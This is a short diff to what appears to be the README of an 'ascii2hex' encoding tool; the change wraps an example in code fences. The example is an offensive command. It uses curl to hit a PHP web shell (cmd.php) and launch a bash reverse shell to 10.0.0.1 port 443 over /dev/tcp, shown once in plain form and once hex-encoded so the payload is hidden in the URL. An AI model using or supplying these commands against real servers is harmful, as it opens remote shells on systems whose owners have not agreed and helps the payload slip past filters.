@@ -23,4 +23,6 @@ this tool is vulable since if we can inject code to some url and we need to inse
 curl "http://192.168.183.91/cmd.php?cmd=$(ascii2hex "/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/443 0>&1'")"                                        
 ```
 in that case the request will be as follow:
+```
 curl "http://192.168.183.91/cmd.php?cmd=%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%30%2e%30%2e%31%2f%34%34%33%20%30%3e%26%31%27"
+```
